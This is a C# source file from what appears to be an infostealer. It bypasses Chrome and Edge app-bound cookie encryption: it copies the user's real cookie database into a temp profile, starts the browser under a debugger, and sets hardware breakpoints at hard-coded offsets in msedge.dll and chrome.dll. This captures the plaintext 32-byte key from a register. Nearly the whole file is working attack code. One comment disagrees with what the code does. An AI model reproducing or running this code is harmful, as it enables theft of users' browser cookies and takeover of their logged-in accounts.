// AbeHwbp.cs: Edge HWBP key path (VoidStealer-class). Static per-build
// trap sites plus a debug-event-driven hardware breakpoint that captures
// the plaintext key out of RDX.
//
// Flow:
//   1. temp profile = real Local State (app_bound_encrypted_key) + real
//      Cookies DB (v20 rows). CookieMonster decrypts every row at DB load,
//      so the app-bound key fetch is guaranteed, not lazy.
//   2. spawn browser CREATE_SUSPENDED | DEBUG_PROCESS: the debugger is
//      attached from birth, so every child (including the StorageService
//      utility where cookie decrypt lives in M13x+) routes debug events to
//      us, and each process's msedge.dll LOAD_DLL event arms Dr0 BEFORE its
//      first decrypt.
//   3. single-step trap: RDX = plaintext key buffer; RPM 32 bytes.
//   4. clear BPs, detach, terminate.
//
// Trap sites (per-build):
//   msedge.dll  158.0.4370.33  RVA 0x9430db6   mov rdx, r12   (pre string-ctor)
//   chrome.dll  157.0.8103.39  RVA 0x955673    mov rdx, r15
//
// Dr7 offset in x64 CONTEXT = 0x70 (not 0xA8, which is inside the FPU area).

using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace Abe
{
    internal static class Hwbp
    {
        private static readonly long[] EdgeBpRvas = { 0x9430db6 };
        private static readonly long[] ChromeBpRvas = { 0x955673 };

        private const uint EV_EXCEPTION = 1;
        private const uint EV_CREATE_THREAD = 2;
        private const uint EV_CREATE_PROCESS = 3;
        private const uint EV_EXIT_PROCESS = 5;
        private const uint EV_LOAD_DLL = 6;
        private const uint STATUS_SINGLE_STEP = 0x80000004;
        private const int DBG_CONTINUE = 0x00010002;

        private const uint CTX_DEBUG_REGISTERS = 0x100010;
        private const int CTXOFF_ContextFlags = 0x30;
        private const int CTXOFF_Dr0 = 0x48;
        private const int CTXOFF_Dr7 = 0x70;
        private const int CTXOFF_Rdx = 0x88;
        private const int SIZE_OF_X64_CONTEXT = 1232;

        [StructLayout(LayoutKind.Sequential)]
        private struct DEBUG_EVENT
        {
            public uint dwDebugEventCode;
            public uint dwProcessId;
            public uint dwThreadId;
            public ulong U0, U1, U2, U3, U4, U5, U6, U7,
                         U8, U9, U10, U11, U12, U13, U14, U15,
                         U16, U17, U18, U19; // union payload; exception code
                                             // lives in U0 low dword
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct MODULEENTRY32W
        {
            public uint dwSize;
            public uint th32ModuleID;
            public uint th32ProcessID;
            public uint GlblcntUsage;
            public uint ProccntUsage;
            public IntPtr modBaseAddr;
            public uint modBaseSize;
            public IntPtr hModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string szModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExePath;
        }

        [DllImport("kernel32", SetLastError = true)]
        private static extern bool DebugActiveProcess(uint pid);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool DebugActiveProcessStop(uint pid);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool WaitForDebugEvent(out DEBUG_EVENT ev, uint ms);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool ContinueDebugEvent(uint pid, uint tid, uint status);
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint pid);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool Module32FirstW(IntPtr snap, ref MODULEENTRY32W me);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool Module32NextW(IntPtr snap, ref MODULEENTRY32W me);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr h, IntPtr baseAddr,
            byte[] buf, IntPtr size, out IntPtr read);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr h, IntPtr baseAddr,
            IntPtr buf, IntPtr size, out IntPtr read);
        [DllImport("kernel32", SetLastError = true)]
        private static extern uint SuspendThread(IntPtr h);
        [DllImport("kernel32", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr h);
        [DllImport("kernel32", SetLastError = true)]
        private static extern int GetThreadContext(IntPtr h, IntPtr ctx);
        [DllImport("kernel32", SetLastError = true)]
        private static extern int SetThreadContext(IntPtr h, IntPtr ctx);
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr OpenThread(uint access, bool inherit, uint tid);
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);
        [DllImport("kernel32", SetLastError = true)]
        private static extern ulong GetTickCount64();
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool TerminateProcess(IntPtr h, uint code);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr h);
        [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr GetModuleHandleW(string name);
        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr h, string name);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessW(string app, string cmd,
            IntPtr pa, IntPtr ta, bool ih, uint flags, IntPtr env, IntPtr cwd,
            ref Dump.STARTUPINFO si, out Dump.PROCESS_INFORMATION pi);

        // NtGetNextThread (enumerate threads without TOOLHELP handle churn)
        private delegate int NtGetNextThreadD(
            IntPtr processHandle, IntPtr prevThread, uint desiredAccess,
            uint handleAttributes, uint flags, out IntPtr nextThread);

        private static NtGetNextThreadD _ntGetNextThread;

        private static IntPtr NtGetNextThread(IntPtr hProcess, IntPtr prev)
        {
            if (_ntGetNextThread == null)
            {
                IntPtr ntdll = GetModuleHandleW("ntdll");
                IntPtr p = GetProcAddress(ntdll, "NtGetNextThread");
                if (p == IntPtr.Zero)
                    throw new InvalidOperationException("NtGetNextThread unavailable");
                _ntGetNextThread = (NtGetNextThreadD)Marshal.GetDelegateForFunctionPointer(
                    p, typeof(NtGetNextThreadD));
            }
            IntPtr next;
            int st = _ntGetNextThread(hProcess, prev, 0x1FFFFF, 0, 0, out next);
            return st < 0 ? IntPtr.Zero : next;
        }

        private static void SetDr0(IntPtr hThread, ulong addr, bool clear)
        {
            SuspendThread(hThread);
            IntPtr ctx = Marshal.AllocHGlobal(SIZE_OF_X64_CONTEXT);
            for (int i = 0; i < SIZE_OF_X64_CONTEXT; i += 8)
                Marshal.WriteInt64(ctx, i, 0);
            Marshal.WriteInt32(ctx, CTXOFF_ContextFlags, unchecked((int)CTX_DEBUG_REGISTERS));
            if (GetThreadContext(hThread, ctx) != 0)
            {
                Marshal.WriteInt64(ctx, CTXOFF_Dr0, clear ? 0 : (long)addr);
                Marshal.WriteInt64(ctx, CTXOFF_Dr7, clear ? 0 : 1); // L0/G0
                SetThreadContext(hThread, ctx);
            }
            Marshal.FreeHGlobal(ctx);
            ResumeThread(hThread);
        }

        private static void SetDr0AllThreads(IntPtr hProcess, ulong addr)
        {
            IntPtr prev = IntPtr.Zero;
            int n = 0;
            while (true)
            {
                IntPtr th = NtGetNextThread(hProcess, prev);
                if (th == IntPtr.Zero) break;
                SetDr0(th, addr, false);
                if (prev != IntPtr.Zero) CloseHandle(prev);
                prev = th;
                if (++n >= 512) break; // sane cap (sample uses the same)
            }
            if (prev != IntPtr.Zero) CloseHandle(prev);
        }

        private static ulong FindModuleBase(uint pid, string dllName)
        {
            IntPtr snap = CreateToolhelp32Snapshot(0x8 /* TH32CS_SNAPMODULE */, pid);
            if (snap == IntPtr.Zero || snap == (IntPtr)(-1)) return 0;
            try
            {
                var me = new MODULEENTRY32W { dwSize = (uint)Marshal.SizeOf(typeof(MODULEENTRY32W)) };
                bool ok = Module32FirstW(snap, ref me);
                while (ok)
                {
                    if (string.Equals(me.szModule, dllName, StringComparison.OrdinalIgnoreCase))
                        return (ulong)me.modBaseAddr;
                    ok = Module32NextW(snap, ref me);
                }
                return 0;
            }
            finally { CloseHandle(snap); }
        }

        // main entry: returns the 32-byte plaintext key or null
        public static byte[] Run(bool edge)
        {
            long[] bpRvas = edge ? EdgeBpRvas : ChromeBpRvas;
            string dllName = edge ? "msedge.dll" : "chrome.dll";

            // 1. seeded temp profile
            string realUD = Dump.UserDataDirPublic(edge);
            string tempUD = Path.Combine(Path.GetTempPath(),
                "abe_" + Guid.NewGuid().ToString("N").Substring(0, 10));
            Directory.CreateDirectory(Path.Combine(tempUD, "Default", "Network"));
            string srcLS = Path.Combine(realUD, "Local State");
            string srcCK = Path.Combine(realUD, "Default", "Network", "Cookies");
            if (!File.Exists(srcLS) || !File.Exists(srcCK))
            {
                Console.Error.WriteLine("abe: Local State / Cookies missing for HWBP profile");
                return null;
            }
            File.Copy(srcLS, Path.Combine(tempUD, "Local State"));
            File.Copy(srcCK, Path.Combine(tempUD, "Default", "Network", "Cookies"));
            foreach (var ext in new[] { "-wal", "-journal" })
                if (File.Exists(srcCK + ext))
                    File.Copy(srcCK + ext, Path.Combine(tempUD, "Default", "Network", "Cookies" + ext));

            string exe = Dump.ResolveExePublic(edge);
            if (exe == null)
            {
                Console.Error.WriteLine("abe: browser exe not found");
                CleanupProfile(tempUD);
                return null;
            }

            // 2. spawn suspended + debugged from birth (DEBUG_PROCESS routes
            //    every child's debug events here, including the storage
            //    utility where cookie decrypt lives in M13x+)
            var si = new Dump.STARTUPINFO(); si.cb = (uint)Marshal.SizeOf(si);
            Dump.PROCESS_INFORMATION pi;
            string cmdArgs = "\"" + exe + "\" --headless=new --disable-gpu --no-first-run" +
                " --no-default-browser-check --no-sandbox --user-data-dir=\"" + tempUD + "\"";
            if (!CreateProcessW(exe, cmdArgs, IntPtr.Zero, IntPtr.Zero, false,
                    0x4 /* CREATE_SUSPENDED */ | 0x1 /* DEBUG_PROCESS */,
                    IntPtr.Zero, IntPtr.Zero, ref si, out pi))
            {
                Console.Error.WriteLine("abe: CreateProcess failed GLE=" +
                    Marshal.GetLastWin32Error());
                CleanupProfile(tempUD);
                return null;
            }
            ResumeThread(pi.hThread);

            // 3. debug loop: arm Dr0 per-process at msedge.dll LOAD_DLL,
            //    steal on single-step
            byte[] key = null;
            var armedProcesses = new HashSet<uint>();
            long deadline = (long)GetTickCount64() + 90000;
            try
            {
                while ((long)GetTickCount64() < deadline && key == null)
                {
                    DEBUG_EVENT ev;
                    if (!WaitForDebugEvent(out ev, 2000)) continue;
                    try
                    {
                        switch (ev.dwDebugEventCode)
                        {
                            case EV_CREATE_PROCESS:
                            case EV_LOAD_DLL:
                            case EV_CREATE_THREAD:
                                if (!armedProcesses.Contains(ev.dwProcessId))
                                {
                                    ulong baseAddr = FindModuleBase(ev.dwProcessId, dllName);
                                    if (baseAddr != 0)
                                    {
                                        foreach (long rva in bpRvas)
                                        {
                                            ulong bp = baseAddr + (ulong)rva;
                                            CurrentBp = bp;
                                            IntPtr ph = OpenProcess(0x1F0FFF, false,
                                                ev.dwProcessId);
                                            if (ph != IntPtr.Zero)
                                            {
                                                SetDr0AllThreads(ph, bp);
                                                armedProcesses.Add(ev.dwProcessId);
                                                Console.Error.WriteLine("[*] HWBP armed in pid " +
                                                    ev.dwProcessId + " at " + dllName + "+0x" +
                                                    rva.ToString("x") + " (base 0x" +
                                                    baseAddr.ToString("x") + ")");
                                                CloseHandle(ph);
                                            }
                                            break;
                                        }
                                    }
                                }
                                else if (ev.dwDebugEventCode == EV_CREATE_THREAD)
                                {
                                    if (CurrentBp != 0)
                                    {
                                        IntPtr th = OpenThread(0x0040 | 0x0008 | 0x0002 | 0x0010,
                                            false, ev.dwThreadId);
                                        if (th != IntPtr.Zero)
                                        { SetDr0(th, CurrentBp, false); CloseHandle(th); }
                                    }
                                }
                                break;

                            case EV_EXCEPTION:
                                {
                                    int code = unchecked((int)ev.U0);
                                    if (code == unchecked((int)STATUS_SINGLE_STEP) &&
                                        armedProcesses.Contains(ev.dwProcessId))
                                    {
                                        IntPtr th = OpenThread(0x0040 | 0x0008 | 0x0010,
                                            false, ev.dwThreadId);
                                        IntPtr ph = OpenProcess(0x0010 | 0x0008, false,
                                            ev.dwProcessId);
                                        if (th != IntPtr.Zero && ph != IntPtr.Zero)
                                        {
                                            IntPtr ctx = Marshal.AllocHGlobal(SIZE_OF_X64_CONTEXT);
                                            for (int i = 0; i < SIZE_OF_X64_CONTEXT; i += 8)
                                                Marshal.WriteInt64(ctx, i, 0);
                                            Marshal.WriteInt32(ctx, CTXOFF_ContextFlags,
                                                unchecked((int)0x10003B)); // ALL
                                            if (GetThreadContext(th, ctx) != 0)
                                            {
                                                ulong rdx = (ulong)Marshal.ReadInt64(ctx, CTXOFF_Rdx);
                                                var buf = new byte[32];
                                                IntPtr rb = Marshal.AllocHGlobal(32);
                                                IntPtr rw;
                                                if (ReadProcessMemory(ph, (IntPtr)rdx,
                                                        rb, (IntPtr)32, out rw) && rw == (IntPtr)32)
                                                {
                                                    Marshal.Copy(rb, key = new byte[32], 0, 32);
                                                    bool zero = true;
                                                    foreach (byte b in key) if (b != 0) { zero = false; break; }
                                                    if (zero) key = null;
                                                }
                                                Marshal.FreeHGlobal(rb);
                                            }
                                            Marshal.FreeHGlobal(ctx);
                                            CloseHandle(th);
                                            CloseHandle(ph);
                                            if (key != null)
                                                Console.Error.WriteLine("[+] HWBP trap: key recovered from pid " +
                                                    ev.dwProcessId);
                                            // clear breakpoints after the hit
                                            IntPtr cph = OpenProcess(0x0008, false, ev.dwProcessId);
                                            if (cph != IntPtr.Zero)
                                            { SetDr0AllThreads(cph, 0); CloseHandle(cph); }
                                        }
                                    }
                                    break;
                                }

                            case EV_EXIT_PROCESS:
                                armedProcesses.Remove(ev.dwProcessId);
                                if (ev.dwProcessId == (uint)pi.pid && key == null)
                                    return null; // browser died before decrypt
                                break;
                        }
                    }
                    finally
                    {
                        // single-step traps must be SWALLOWED (DBG_CONTINUE);
                        // everything else propagates to the app's own SEH
                        // (Chromium throws internally, e.g. thread naming)
                        ContinueDebugEvent(ev.dwProcessId, ev.dwThreadId, DBG_CONTINUE);
                    }
                }
                return key;
            }
            finally
            {
                DebugActiveProcessStop((uint)pi.pid);
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
                CleanupProfile(tempUD);
            }
        }

        private static ulong CurrentBp; // Dr0 currently armed (0 = none)

        private static void CleanupProfile(string dir)
        {
            try { if (Directory.Exists(dir)) Directory.Delete(dir, true); } catch { }
        }
    }
}
